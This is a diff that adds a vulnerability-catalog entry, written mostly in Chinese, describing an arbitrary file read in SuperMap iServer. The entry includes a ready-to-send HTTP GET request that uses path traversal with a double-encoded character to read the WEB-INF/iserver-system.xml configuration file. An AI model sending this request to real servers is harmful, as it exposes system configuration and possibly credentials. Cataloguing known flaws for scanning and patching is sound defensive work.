@@ -1,0 +1,11 @@
+vendor = "SuperMap"
+name = "SuperMap iServer output 任意文件读取漏洞"
+type = "任意文件读取"
+path = "/iserver/output/../WEB-INF/iserver-system.xml"
+version = ""
+detail = "GET /iserver/output/../WEB-IN%2546/iserver-system.xml HTTP/1.1 Host: target"
+fix = "升级至最新版本"
+date = 20260315
+label = "nday"
+cve = "TVD-2026-05859"
+verifier = "AdySec"
